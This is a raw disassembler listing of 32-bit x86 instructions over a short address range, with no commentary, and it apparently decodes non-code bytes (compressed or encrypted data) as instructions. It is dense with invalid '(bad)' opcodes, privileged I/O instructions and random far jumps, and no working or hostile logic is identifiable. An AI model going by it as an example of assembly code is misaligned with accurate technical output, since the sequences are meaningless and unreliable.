  41f9ce:	int    0xb
  41f9d0:	and    DWORD PTR [eax+0x61f34c85],ebx
  41f9d6:	fst    DWORD PTR [esi+0x36]
  41f9d9:	push   esp
  41f9da:	dec    esp
  41f9db:	ficomp DWORD PTR [ecx+0x38af185b]
  41f9e1:	fist   DWORD PTR [edi+0x1d]
  41f9e4:	repnz stos DWORD PTR es:[edi],eax
  41f9e6:	rol    BYTE PTR [eax+eax*1+0x0],0x0
  41f9eb:	add    BYTE PTR [eax],al
  41f9ed:	add    BYTE PTR [eax],al
  41f9ef:	add    BYTE PTR [eax],al
  41f9f1:	mov    edi,0x9c801c2f
  41f9f6:	mov    bl,0xbf
  41f9f8:	aas    
  41f9f9:	sysexit 
  41f9fb:	pop    ecx
  41f9fc:	push   ss
  41f9fd:	push   ecx
  41f9fe:	scas   al,BYTE PTR es:[edi]
  41f9ff:	retf   0xcdf0
  41fa02:	je     0x41fa05
  41fa04:	add    BYTE PTR [edi-0x13fffffd],ch
  41fa0a:	retf   0xa533
  41fa0d:	outs   dx,DWORD PTR ds:[esi]
  41fa0e:	cmp    bh,BYTE PTR [ebx]
  41fa10:	add    eax,0xe29ddeda
  41fa15:	or     eax,0x8204a438
  41fa1a:	add    ah,BYTE PTR [ebx+0x682ebb62]
  41fa20:	fs xchg ebp,eax
  41fa22:	lds    ebx,FWORD PTR ds:0x493ba502
  41fa28:	jns    0x41fa13
  41fa2a:	mov    esp,DWORD PTR ds:0x951a949
  41fa30:	mov    bh,0x6b
  41fa32:	scas   al,BYTE PTR es:[edi]
  41fa33:	(bad)  
  41fa35:	iret   
  41fa36:	inc    esi
  41fa37:	mov    dl,0x60
  41fa39:	data16 std 
  41fa3b:	or     al,0xb3
  41fa3d:	in     eax,dx
  41fa3e:	lahf   
  41fa3f:	retf   0xe9f7
  41fa42:	mov    ch,0x69
  41fa44:	out    0xa9,eax
  41fa46:	(bad)  
  41fa48:	jle    0x41fa41
  41fa4a:	sub    eax,0x677dea46
  41fa4f:	xor    BYTE PTR [edx+0xc6edf76],bl
  41fa55:	cld    
  41fa56:	lods   al,BYTE PTR ds:[esi]
  41fa57:	inc    esi
  41fa59:	jae    0x41fa58
  41fa5b:	shr    BYTE PTR ds:0xac6a06a,0x6d
  41fa62:	es (bad) 
  41fa64:	(bad)  
  41fa65:	jne    0x41faaf
  41fa67:	push   0x1d665037
  41fa6c:	mov    ebx,DWORD PTR [ecx]
  41fa6e:	xchg   DWORD PTR [eax+0x765864e7],ecx
  41fa74:	neg    dl
  41fa76:	int    0x61
  41fa78:	pop    edx
  41fa79:	daa    
  41fa7a:	cmc    
  41fa7b:	les    edx,FWORD PTR [edx-0x60]
  41fa7e:	push   0x1f
  41fa80:	mov    cl,0xa3
  41fa82:	fucomip st,st(0)
  41fa84:	pop    ds
  41fa85:	dec    esp
  41fa86:	xchg   edi,eax
  41fa87:	jo     0x41fadd
  41fa89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa8a:	lahf   
  41fa8b:	inc    ebp
  41fa8c:	loopne 0x41faa1
  41fa8e:	nop
  41fa8f:	add    edi,eax
  41fa91:	jb     0x41faaf
  41fa93:	inc    ebp
  41fa94:	sub    ebx,esp
  41fa96:	inc    ebp
  41fa97:	sub    al,0x9a
  41fa99:	push   0x55
  41fa9b:	jnp    0x41fa56
  41fa9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa9e:	imul   BYTE PTR [esi+0x65ad6912]
  41faa4:	mov    ecx,ecx
  41faa6:	mov    ebx,esp
  41faa8:	jbe    0x41faec
  41faaa:	call   0x71fc:0x3f4bdbfe
  41fab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fab2:	ficomp DWORD PTR [ecx]
  41fab4:	cld    
  41fab5:	jno    0x41fa61
  41fab7:	jne    0x41faa9
  41fab9:	jl     0x41fb12
  41fabb:	dec    eax
  41fabc:	inc    ecx
  41fabd:	pop    esi
  41fabe:	test   BYTE PTR [bp+di],ch
  41fac1:	sbb    BYTE PTR [eax+ebp*2+0x2f584c1d],cl
  41fac8:	mov    BYTE PTR [eax],dh
  41faca:	into   
  41facb:	(bad)  
  41facc:	rol    edi,cl
  41face:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41facf:	(bad)  
  41fad0:	or     DWORD PTR [eax+eiz*8-0x36],esp
  41fad4:	jnp    0x41fb2c
  41fad6:	inc    esp
  41fad7:	(bad)  
  41fad8:	sub    al,0x30
  41fada:	out    0xcb,eax
  41fadc:	xchg   esp,edi
  41fade:	adc    al,ch
  41fae0:	push   0x41
  41fae2:	test   ah,bh
  41fae4:	ss push eax
  41fae6:	stos   BYTE PTR es:[edi],al
  41fae7:	std    
  41fae8:	push   ss
  41fae9:	std    
  41faea:	push   ecx
  41faeb:	stc    
  41faec:	xchg   BYTE PTR [edx-0x134670d2],dl
  41faf2:	mov    ch,0xc
  41faf4:	xor    ebp,DWORD PTR [edx+0x36aea103]
  41fafa:	and    BYTE PTR [ebx+0x4f],ch
  41fafd:	jne    0x41fb5e
  41faff:	(bad)  
  41fb00:	adc    cl,bh
  41fb02:	ss (bad) 
  41fb05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb06:	sahf   
  41fb07:	sbb    ecx,esp
  41fb09:	cmp    dl,BYTE PTR [edx-0x54]
  41fb0c:	mov    edx,0xb0af355a
  41fb11:	das    
  41fb12:	imul   esi,DWORD PTR [eax+0x23ad1a86],0x4d
  41fb19:	out    0xa2,al
  41fb1b:	data16 adc BYTE PTR [edx+edx*1-0x7d114383],al
  41fb23:	in     al,0x2b
  41fb25:	shr    BYTE PTR [edi+0x268ed902],cl
  41fb2b:	mov    edi,0x6a055d4f
  41fb30:	adc    al,0xa5
  41fb33:	push   esp
  41fb34:	sbb    al,0x8f
  41fb36:	gs push ds
  41fb38:	call   DWORD PTR [ebx-0x84c017d]
  41fb3e:	iret   
  41fb3f:	sti    
  41fb40:	sub    al,0x7
  41fb42:	sub    al,al
  41fb44:	jbe    0x41fbb1
  41fb46:	and    BYTE PTR [ecx],ah
  41fb48:	(bad)  
  41fb49:	pop    edx
  41fb4a:	in     eax,dx
  41fb4b:	jp     0x41fb70
  41fb4d:	or     al,0xba
  41fb4f:	or     DWORD PTR [ecx+eiz*8],ebx
  41fb52:	mov    dl,0x2d
  41fb54:	adc    DWORD PTR [ecx],esi
  41fb56:	push   edi
  41fb57:	and    DWORD PTR [esi],eax
  41fb59:	jl     0x41fb6d
  41fb5b:	jb     0x41fbba
  41fb5d:	sub    edi,eax
  41fb5f:	loopne 0x41fbaf
  41fb61:	xchg   esi,eax
  41fb62:	dec    edi
  41fb63:	ror    BYTE PTR [edx+0x50],cl
  41fb66:	(bad)  
  41fb67:	pop    edi
  41fb68:	pop    edx
  41fb69:	mov    edi,0xf983e243
  41fb6e:	mov    ds:0x23f78c72,al
  41fb73:	pop    ds
  41fb74:	adc    al,0x9b
  41fb76:	mov    ?,edi
  41fb78:	in     eax,0x14
  41fb7a:	and    esi,DWORD PTR [ecx-0x1a]
  41fb7d:	sub    al,0xee
  41fb7f:	add    dl,BYTE PTR [edx+eiz*8-0x4311e506]
  41fb86:	sub    eax,0x206b1200
  41fb8b:	shl    bl,0x4c
  41fb8e:	add    DWORD PTR [ecx-0x3],ecx
  41fb91:	mov    cl,0x37
  41fb93:	xchg   ebx,eax
  41fb94:	xchg   ebx,eax
  41fb95:	sar    DWORD PTR [eax+0x7f],1
  41fb98:	or     DWORD PTR [ecx-0x39],ebx
  41fb9b:	or     ah,BYTE PTR [ecx+0x15]
  41fb9e:	xor    BYTE PTR [edi],bl
  41fba0:	or     al,0x8a
  41fba2:	(bad)  
  41fba3:	fdiv   QWORD PTR [ecx]
  41fba5:	data16 arpl WORD PTR ds:0x72615e3d,bx
  41fbad:	ror    BYTE PTR [eax],cl
  41fbaf:	xchg   DWORD PTR [edx-0x14],edi
  41fbb2:	test   DWORD PTR [edi-0x2df2bd6c],0x2d7dd37d
  41fbbc:	push   edx
  41fbbd:	leave  
  41fbbe:	cdq    
  41fbbf:	adc    DWORD PTR [edi+0x3f083404],ebx
  41fbc5:	cmp    BYTE PTR [edi],0xc
  41fbc8:	rol    BYTE PTR [edx+0x4e3a9e3b],1
  41fbce:	mov    esi,0x5b050830
  41fbd3:	call   0x6ffd:0xb5ac59d1
  41fbda:	out    dx,eax
  41fbdb:	add    al,0x30
  41fbdd:	sub    al,0x88
  41fbdf:	xchg   ecx,eax
  41fbe0:	add    ebp,DWORD PTR [ebx-0x1db841e5]
  41fbe6:	jmp    0x41fb90
  41fbe8:	pop    ebp
  41fbe9:	pop    ebp
  41fbea:	arpl   WORD PTR [ebx-0x37],sp
  41fbed:	xchg   ecx,eax
  41fbee:	sub    al,0xe6
  41fbf0:	mov    DWORD PTR [eax-0x7bcbf7a6],edi
  41fbf6:	push   es
  41fbf7:	out    0x1a,al
  41fbf9:	int    0x2a
  41fbfb:	jo     0x41fc10
  41fbfd:	nop
  41fbfe:	add    eax,DWORD PTR [edi-0x55]
  41fc01:	mov    esi,0xc1967eed
  41fc06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc07:	mov    ch,BYTE PTR [edx]
  41fc09:	into   
  41fc0a:	bound  ebx,QWORD PTR [esp+edx*8-0x6ec733a0]
  41fc11:	or     cl,bl
  41fc13:	xchg   cx,ax
  41fc15:	xor    al,0xca
  41fc17:	mov    esi,ecx
  41fc19:	jg     0x41fb9b
  41fc1b:	push   edi
  41fc1c:	jp     0x41fc81
  41fc1e:	out    0x44,eax
  41fc20:	popf   
  41fc21:	imul   ebx,DWORD PTR gs:[bp-0x69],0xffffffc5
  41fc27:	iret   
  41fc28:	xor    eax,0xf26f0ebe
  41fc2d:	or     eax,0x32880df2
  41fc32:	pop    ebx
  41fc33:	adc    BYTE PTR [ebx-0xd724a96],0x91
  41fc3a:	sbb    dl,BYTE PTR [eax+0x3b7af837]
  41fc40:	out    0x4,al
  41fc42:	push   ebx
  41fc43:	mov    DWORD PTR [edx+0x2a64f17d],eax
  41fc49:	jbe    0x41fc20
  41fc4b:	cmp    eax,0x5d7dbe8c
  41fc50:	inc    BYTE PTR [edx+esi*8+0x16727dd8]
  41fc57:	dec    ebx
  41fc58:	cs xor eax,ecx
  41fc5b:	bound  ecx,QWORD PTR [edx+ebp*2]
  41fc5e:	adc    al,BYTE PTR [edx]
  41fc60:	mov    dl,0xa3
  41fc62:	leave  
  41fc63:	loopne 0x41fbf9
  41fc65:	fstp   st(3)
  41fc67:	inc    ebx
  41fc68:	mov    BYTE PTR [ebx+0x9f182ac],bl
  41fc6e:	retf   
  41fc6f:	in     eax,0x4a
  41fc71:	bound  eax,QWORD PTR [eax]
  41fc73:	dec    esp
  41fc74:	dec    edi
  41fc75:	aam    0x4e
  41fc77:	hlt    
  41fc78:	jl     0x41fce4
  41fc7a:	ins    DWORD PTR es:[edi],dx
  41fc7b:	ret    0xa7aa
  41fc7e:	shr    BYTE PTR [esi-0xc],cl
  41fc81:	dec    edi
  41fc82:	push   ecx
  41fc83:	aaa    
  41fc84:	cli    
  41fc85:	jnp    0x41fc25
  41fc87:	sub    al,0x3e
  41fc89:	fstp   DWORD PTR [edi]
  41fc8b:	into   
  41fc8c:	jo     0x41fc3e
  41fc8e:	jae    0x41fd03
  41fc90:	fsubr  QWORD PTR [ebp-0x39d6dbb0]
  41fc96:	arpl   WORD PTR [eax-0x42],ax
  41fc99:	in     eax,0xa7
  41fc9b:	or     eax,0x1168b23f
  41fca0:	pushf  
  41fca1:	push   esi
  41fca2:	sti    
  41fca3:	out    dx,al
  41fca4:	int    0x59
  41fca6:	(bad)  
  41fca7:	pop    eax
  41fca8:	xchg   ebp,eax
  41fca9:	dec    ebx
  41fcaa:	mov    al,ds:0xa2151b0f
  41fcaf:	sti    
  41fcb0:	fisttp DWORD PTR ds:0x6be02516
  41fcb6:	sahf   
  41fcb7:	test   eax,0xb9de2231
  41fcbc:	xor    eax,DWORD PTR [ecx+ecx*2+0x24]
  41fcc0:	in     eax,0x85
  41fcc2:	js     0x41fc69
  41fcc4:	lods   al,BYTE PTR ds:[esi]
  41fcc5:	cli    
  41fcc6:	lahf   
  41fcc7:	shl    BYTE PTR [ebx+0x39550a3a],1
  41fccd:	mov    dh,0x23
  41fccf:	or     al,dl
  41fcd1:	dec    esp
  41fcd2:	out    dx,eax
  41fcd3:	xor    dl,BYTE PTR [ecx+0xc4bde7a]
  41fcd9:	mov    al,ds:0xf51371e1
  41fcde:	add    DWORD PTR [ebp+ecx*2-0x44],edi
  41fce2:	(bad)  
  41fce3:	pop    ecx
  41fce4:	shr    DWORD PTR ds:[ecx-0x57],1
  41fce8:	sbb    eax,0xfa935832
  41fced:	adc    al,0xd9
  41fcef:	fidiv  WORD PTR [ecx]
  41fcf1:	lods   eax,DWORD PTR ds:[esi]
  41fcf2:	out    dx,al
  41fcf3:	and    esi,ebp
  41fcf5:	pop    ds
  41fcf6:	sub    ebx,ebp
  41fcf8:	jae    0x41fcad
  41fcfa:	jns    0x41fc9d
  41fcfc:	pop    edx
  41fcfd:	add    esp,edi
  41fcff:	lea    ecx,[edx-0x59]
  41fd02:	inc    ecx
  41fd03:	jp     0x41fc8e
  41fd05:	mov    bl,0x17
  41fd07:	jl     0x41fc99
  41fd09:	dec    ebp
  41fd0a:	cs mov dl,bl
  41fd0d:	or     dh,BYTE PTR ds:0x101843fe
  41fd13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd14:	and    dl,0xbb
  41fd17:	imul   ecx,edx,0x62c1f015
  41fd1d:	push   ss
  41fd1e:	push   edi
  41fd1f:	lahf   
  41fd20:	bound  esp,QWORD PTR [edi+0x25]
  41fd23:	leave  
  41fd24:	mov    edx,0x9f069536
  41fd29:	mov    ds:0xa0e67e0a,al
  41fd2e:	mov    ebp,0xfa875b3
  41fd33:	mov    DWORD PTR gs:[edx+0x62b6bf75],edx
  41fd3a:	adc    al,0x86
  41fd3c:	and    bh,cl
  41fd3e:	mov    ebx,DWORD PTR [edx-0x46958d1]
  41fd44:	inc    eax
  41fd45:	outs   dx,BYTE PTR ds:[esi]
  41fd46:	pop    ecx
  41fd47:	add    bl,BYTE PTR [ebx+0x43e7354d]
  41fd4d:	push   cs
  41fd4e:	ret    
  41fd4f:	dec    esi
  41fd50:	push   es
  41fd51:	pushf  
  41fd52:	imul   ebp,DWORD PTR [edi],0xf9003b6f
  41fd58:	inc    esp
  41fd59:	jne    0x41fdce
  41fd5b:	xlat   BYTE PTR ds:[ebx]
  41fd5c:	and    bl,BYTE PTR [ebx+esi*2+0x2f]
  41fd60:	ds pop ss
  41fd62:	push   cs
  41fd63:	les    edx,FWORD PTR [ecx+0x2ce792a0]
  41fd69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd6a:	xchg   cl,ah
  41fd6c:	xor    ecx,DWORD PTR [edi+0x5f]
  41fd6f:	sbb    edx,edi
  41fd71:	inc    ebp
  41fd72:	jecxz  0x41fcfb
  41fd74:	stos   DWORD PTR es:[edi],eax
  41fd75:	clc    
  41fd76:	or     al,0x5a
  41fd78:	scas   al,BYTE PTR es:[edi]
  41fd79:	fcomp  QWORD PTR [edi+edi*8+0x6]
  41fd7d:	(bad)  
  41fd7e:	jecxz  0x41fdf0
  41fd80:	and    bh,BYTE PTR [ebx-0x3b]
  41fd83:	xchg   esi,eax
  41fd84:	push   0x8c3800c1
  41fd89:	shl    al,1
  41fd8b:	or     eax,edx
  41fd8d:	mov    ecx,0x9026bc34
  41fd92:	pop    edx
  41fd93:	cli    
  41fd94:	sub    DWORD PTR [esi],ebp
  41fd96:	pop    edi
  41fd97:	sbb    esi,DWORD PTR [ecx+edi*8+0x64493e58]
  41fd9e:	push   ss
  41fd9f:	std    
  41fda0:	pop    edi
  41fda1:	mul    BYTE PTR [ecx-0x5e]
  41fda4:	or     DWORD PTR [ebx],edx
  41fda6:	sar    BYTE PTR [eax+eiz*2+0x2f],0x5a
  41fdab:	xchg   ecx,eax
  41fdac:	mov    WORD PTR gs:[edx+0xc73cc5f],?
  41fdb3:	(bad)  
  41fdb4:	(bad)  
  41fdb5:	pop    ecx
  41fdb6:	loopne 0x41fe21
	...
  41fdc0:	add    BYTE PTR [ecx-0x400c494c],cl
  41fdc6:	repz int 0xfe
  41fdc9:	push   ebp
  41fdca:	cmp    BYTE PTR [edx-0x7a],bl
  41fdcd:	pop    ecx
  41fdce:	icebp  
  41fdcf:	in     al,dx
  41fdd0:	mov    ds:0x1787c,al
  41fdd5:	scas   eax,DWORD PTR es:[edi]
  41fdd6:	add    eax,DWORD PTR [eax]
  41fdd8:	add    ah,dh
  41fdda:	into   
  41fddb:	adc    eax,0xcdea74d8
  41fde0:	(bad)  
  41fde1:	xor    BYTE PTR [edx+0x20578413],ah
  41fde7:	jnp    0x41fe1e
  41fde9:	cld    
  41fdea:	mov    ds,ecx
  41fdec:	xor    bp,WORD PTR [ebp-0x42]
  41fdf0:	lahf   
  41fdf1:	xor    dh,BYTE PTR [ecx-0x2b]
  41fdf4:	jns    0x41fe3e
  41fdf6:	shl    esi,1
  41fdf8:	hlt    
  41fdf9:	mov    al,ds:0x66e1889c
  41fdfe:	sub    bl,dl
  41fe00:	fbstp  TBYTE PTR [ebp+0x265f0bfc]
  41fe06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe07:	(bad)  
  41fe08:	lds    eax,FWORD PTR [esi]
  41fe0a:	mov    ecx,ebx
  41fe0c:	push   ebx
  41fe0d:	add    ecx,ebx
  41fe0f:	lods   eax,DWORD PTR ds:[esi]
  41fe10:	ins    BYTE PTR es:[edi],dx
  41fe11:	and    al,cl
  41fe13:	add    al,0x39
  41fe15:	repnz mov al,0xb
  41fe18:	add    eax,0xe5e948e8
  41fe1d:	gs jmp 0x41fdf3
  41fe20:	in     eax,dx
  41fe21:	lea    edi,[edi+0x67f2abac]
  41fe27:	push   ss
  41fe28:	int    0xfa
  41fe2a:	rcr    DWORD PTR [ebx-0x52],0x16
  41fe2e:	push   ebp
  41fe2f:	pop    ds
  41fe30:	and    ah,BYTE PTR [ecx-0x43]
  41fe33:	inc    eax
  41fe34:	je     0x41fe6d
  41fe36:	pop    eax
  41fe37:	cmp    eax,0xf2e89333
  41fe3c:	int    0xec
  41fe3e:	aaa    
  41fe3f:	inc    ecx
  41fe40:	ret    
  41fe41:	jae    0x41fdfe
  41fe43:	jmp    0x345f:0xcb269e34
  41fe4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe4b:	adc    al,0xa4
  41fe4d:	jae    0x41fe15
  41fe4f:	out    0x37,eax
  41fe51:	popf   
  41fe52:	mov    ecx,0x73e85b4e
  41fe57:	add    eax,DWORD PTR [ebx-0x7a]
  41fe5a:	or     al,0x4a
  41fe5c:	sbb    dl,BYTE PTR [ebp-0x41e666df]
  41fe62:	loop   0x41fe6e
  41fe64:	xchg   ecx,edx
  41fe66:	mov    dh,BYTE PTR [esi]
  41fe68:	mov    ch,0xed
  41fe6a:	popf   
  41fe6b:	(bad)  
  41fe6c:	imul   BYTE PTR [edi-0x2d]
  41fe6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe70:	fcmovu st,st(5)
  41fe72:	stos   DWORD PTR es:[edi],eax
  41fe73:	sbb    eax,DWORD PTR [edx-0x4fff6673]
  41fe79:	ss ret 
  41fe7b:	cmp    ch,BYTE PTR [edx-0x7e]
  41fe7e:	ror    DWORD PTR [esp+ecx*4],0xdd
  41fe82:	adc    al,al
  41fe84:	mov    DWORD PTR [ecx+0x54],ebx
  41fe87:	and    edx,DWORD PTR [ebp-0x10a3309b]
  41fe8d:	cmp    ch,ah
  41fe8f:	adc    DWORD PTR es:[edx+0x70],ebx
  41fe93:	leave  
  41fe94:	scas   al,BYTE PTR es:[edi]
  41fe95:	inc    edx
  41fe96:	mov    ss,edx
  41fe98:	push   ds
  41fe99:	or     eax,0xe11e83da
  41fe9e:	mov    BYTE PTR [esi+0x3210769d],ah
  41fea4:	dec    esi
  41fea5:	hlt    
  41fea6:	sub    al,0x90
  41fea8:	in     eax,dx
  41fea9:	out    0x33,eax
  41feab:	jg     0x41fefd
  41fead:	pop    esi
  41feae:	retf   
  41feaf:	ror    DWORD PTR [ecx-0x1f07c3d0],cl
  41feb5:	int3   
  41feb6:	cmp    DWORD PTR [edx-0x5d],esp
  41feb9:	xor    ebx,DWORD PTR [edi-0x27]
  41febc:	pop    edi
  41febd:	in     eax,0x6
  41febf:	rcl    BYTE PTR [si],cl
  41fec2:	aad    0x98
  41fec4:	mov    al,0x3e
  41fec6:	jnp    0x41fea6
  41fec8:	inc    ebx
  41fec9:	sbb    edi,ebx
  41fecb:	adc    eax,0x6a0ec70a
  41fed0:	nop
  41fed1:	cwde   
  41fed2:	lods   al,BYTE PTR ds:[esi]
  41fed3:	mov    gs,ebx
  41fed5:	mov    ch,0x53
  41fed7:	mov    ecx,0x477a063a
  41fedc:	addr16 push es
  41fede:	xchg   DWORD PTR [ecx+0x12517dc8],ebx
  41fee4:	xor    al,BYTE PTR [esi-0x19]
  41fee7:	pop    eax
  41fee8:	js     0x41fea8
  41feea:	jnp    0x41fef9
  41feec:	call   0xf0e53050
  41fef1:	ins    BYTE PTR es:[edi],dx
  41fef2:	outs   dx,BYTE PTR ds:[esi]
  41fef3:	or     BYTE PTR [edx],0x13
  41fef6:	in     al,0xcc
  41fef8:	pusha  
  41fef9:	jge    0x41fed3
  41fefb:	fwait
  41fefc:	stos   BYTE PTR es:[edi],al
  41fefd:	or     al,0x3b
  41feff:	add    eax,0x3c4dce58
  41ff04:	cmp    edi,edx
  41ff06:	push   ebp
  41ff08:	dec    eax
  41ff09:	loopne 0x41ff43
  41ff0b:	push   esp
  41ff0c:	icebp  
  41ff0d:	xor    ebx,DWORD PTR [ecx]
  41ff0f:	in     eax,dx
  41ff10:	or     dl,dl
  41ff12:	cmc    
  41ff13:	lock mov ecx,0xcb14b44
  41ff19:	inc    edi
  41ff1a:	int    0xb2
  41ff1c:	dec    ebp
  41ff1d:	dec    ebp
  41ff1e:	cmp    DWORD PTR [ecx],ebp
  41ff20:	in     eax,dx
  41ff21:	xchg   esp,eax
  41ff22:	jle    0x41ff99
  41ff24:	push   es
  41ff25:	xchg   edi,eax
  41ff26:	pop    esi
  41ff27:	ds addr16 xchg ebx,eax
  41ff2a:	das    
  41ff2b:	cli    
  41ff2c:	mov    ax,WORD PTR [eax+0x21640f24]
  41ff33:	add    DWORD PTR [ecx+0x7bae75ef],ebp
  41ff39:	xchg   BYTE PTR [esi+0x19],bl
  41ff3c:	dec    eax
  41ff3d:	aaa    
  41ff3e:	inc    esp
  41ff3f:	mov    WORD PTR [edi-0x1],ds
  41ff42:	mov    edx,0xbb83c59a
  41ff47:	fwait
  41ff48:	rep lods eax,DWORD PTR ds:[esi]
  41ff4a:	xor    ebx,DWORD PTR [edx]
  41ff4c:	mov    al,ds:0xe7e7ce68
  41ff51:	out    dx,eax
  41ff52:	adc    al,BYTE PTR [ecx-0x6e]
  41ff55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff56:	jae    0x41ff83
  41ff58:	sub    cl,dl
  41ff5a:	jnp    0x41fef1
  41ff5c:	adc    ebx,ecx
  41ff5e:	mov    ah,0x49
  41ff60:	mov    eax,0x4a8c1489
  41ff65:	add    BYTE PTR [eax+0x66],dh
  41ff68:	xchg   BYTE PTR [eax],cl
  41ff6a:	xchg   edx,eax
  41ff6b:	fdivr  DWORD PTR [esi]
  41ff6d:	mov    al,ds:0x58d27c67
  41ff72:	lock jle 0x41ffac
  41ff75:	mov    DWORD PTR [eax+0x57e48498],ebp
  41ff7b:	pop    eax
  41ff7c:	jo     0x41ff6f
  41ff7e:	xor    al,0x25
  41ff80:	pop    es
  41ff81:	imul   edx,DWORD PTR [ebx],0x53ae438d
  41ff87:	ror    DWORD PTR [edx+0x1ca2dd99],0x40
  41ff8e:	sub    ebp,edi
  41ff90:	popf   
  41ff91:	add    esp,0x56
  41ff94:	call   0x69968c93
  41ff99:	jmp    0x791d96ea
  41ff9e:	jnp    0x41ffd8
  41ffa0:	mov    DWORD PTR [ebx+0xad4ec91],eax
  41ffa6:	sbb    DWORD PTR [ecx-0x52],edi
  41ffa9:	sbb    ch,dh
  41ffab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffac:	sahf   
  41ffad:	hlt    
  41ffae:	push   ss
  41ffaf:	jae    0x41ff89
  41ffb1:	pop    ss
  41ffb2:	into   
  41ffb3:	mov    esi,0x41e545d2
  41ffb8:	outs   dx,BYTE PTR ds:[esi]
  41ffb9:	div    ebp
  41ffbb:	test   al,0x9d
  41ffbd:	into   
  41ffbe:	mov    ds:0x3b39f793,eax
  41ffc3:	mov    al,ds:0xf9a2d628
  41ffc8:	stos   BYTE PTR es:[edi],al
  41ffc9:	mov    ebp,0x500ccf7a
  41ffce:	not    ebp
  41ffd0:	inc    ebp
  41ffd1:	mov    bh,0x2d
  41ffd3:	jbe    0x41ffcf
  41ffd5:	pop    edx
  41ffd6:	sub    eax,0x10deb4aa
  41ffdb:	push   edx
  41ffdc:	dec    eax
  41ffdd:	idiv   BYTE PTR [ebx+0x26]
  41ffe0:	enter  0x9944,0x9b
  41ffe4:	cld    
  41ffe5:	popa   
  41ffe6:	xchg   edx,eax
  41ffe7:	sub    eax,0xb94fbb61
  41ffec:	xchg   edx,eax
  41ffed:	mov    eax,0xe3998c61
  41fff2:	or     edi,DWORD PTR [esi]
  41fff4:	push   0xffffffb4
  41fff6:	adc    ebx,esi
  41fff8:	jl     0x41ff93
  41fffa:	xlat   BYTE PTR ds:[ebx]
  41fffb:	loopne 0x420036
  41fffd:	pushf  
  41fffe:	push   edi
  41ffff:	sub    DWORD PTR [edi+0x2d],0x23
  420003:	or     ebx,0x5f
  420006:	dec    ecx
  420007:	daa    
  420008:	or     eax,0xbdb70b71
  42000d:	cmp    esp,DWORD PTR [edx]
  42000f:	std    
  420010:	fst    DWORD PTR [esi]
  420012:	cmp    dl,BYTE PTR [ebx-0x23]
  420015:	mov    esp,0x8024f37c
  42001a:	fisttp DWORD PTR [eax+0x33]
  42001d:	pusha  
  42001e:	cwde   
  42001f:	test   al,0x78
  420021:	and    BYTE PTR [esi+0x3],cl
  420024:	mov    edi,0x92303f65
  420029:	rcr    esi,0x47
  42002c:	xor    eax,0x5ebf85c
  420031:	loop   0x42002c
  420033:	lods   al,BYTE PTR ds:[esi]
  420034:	sub    dl,BYTE PTR [esi]
  420036:	push   ss
  420037:	xchg   edx,eax
  420038:	jo     0x41ffbd
  42003a:	push   eax
  42003b:	and    BYTE PTR [ecx],0x9a
  42003e:	and    ebp,ebp
  420040:	jae    0x420020
  420042:	or     WORD PTR [eax+0x11e43595],ax
  420049:	push   eax
  42004a:	push   cs
  42004b:	fild   WORD PTR [edx]
  42004d:	test   BYTE PTR gs:[ebx+esi*8-0x574902c6],ah
  420055:	and    eax,0x52f17497
  42005a:	jg     0x4200db
  42005c:	cld    
  42005d:	dec    eax
  42005e:	sbb    eax,0x3b42a4ae
  420063:	rcl    dl,cl
  420065:	push   esp
  420066:	dec    ebp
  420067:	clc    
  420068:	dec    esi
  420069:	bound  ebx,QWORD PTR [esp+ecx*4-0x5d]
  42006d:	push   ss
  42006e:	gs mov ch,0x61
  420071:	pop    esi
  420072:	fsubp  st(7),st
  420074:	ret    
  420075:	add    ebp,DWORD PTR [edx-0x716165f5]
  42007b:	push   esi
  42007c:	shl    BYTE PTR [ecx-0x94e1993],cl
  420082:	jmp    0x42005d
  420084:	mov    dl,0x7c
  420086:	sub    eax,0x12cceceb
  42008b:	inc    esp
  42008c:	(bad)  
  42008d:	jmp    0xc876bd56
  420092:	call   0x3d27214b
  420097:	gs (bad) 
  420099:	int3   
  42009a:	rol    DWORD PTR [edx+0x5674f007],1
  4200a0:	popa   
  4200a1:	mov    di,0x90fe
  4200a5:	jne    0x420073
  4200a7:	retf   0x4bf7
  4200aa:	loopne 0x4200af
  4200ac:	mov    esp,0x18ac59ea
  4200b1:	and    al,0x31
  4200b3:	inc    esi
  4200b4:	stc    
  4200b5:	push   edx
  4200b6:	mov    ds:0x1f0d83bf,eax
  4200bb:	lods   eax,DWORD PTR ds:[esi]
  4200bc:	int3   
  4200bd:	fst    QWORD PTR [ebx]
  4200bf:	test   al,0x5d
  4200c1:	aaa    
  4200c2:	pusha  
  4200c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200c4:	mov    ds:0xfcc833e7,eax
  4200c9:	shl    ebx,0x34
  4200cc:	rol    BYTE PTR [ecx],1
  4200ce:	mov    ds:0x2843c056,al
  4200d3:	sbb    dl,0x2d
  4200d6:	mov    bh,ch
  4200d8:	les    ebx,FWORD PTR [eax+0x2e]
  4200db:	outs   dx,DWORD PTR ds:[esi]
  4200dc:	pop    eax
  4200dd:	push   ebx
  4200de:	dec    esp
  4200df:	adc    al,0x76
  4200e1:	ins    BYTE PTR es:[edi],dx
  4200e2:	(bad)  
  4200e3:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e5:	les    ebp,FWORD PTR [ebp-0x94a4694]
  4200eb:	pop    edx
  4200ec:	mov    ebp,0x48388780
  4200f1:	and    DWORD PTR [ecx],ecx
  4200f3:	push   ecx
  4200f4:	(bad)  
  4200f5:	popf   
  4200f6:	out    dx,eax
  4200f7:	test   al,0x81
  4200f9:	add    BYTE PTR [edi-0x1d7931ba],bl
  4200ff:	repz mov ds:0xa7806412,al
  420105:	and    al,0xfb
  420107:	inc    ebx
  420108:	sbb    eax,0x897671e6
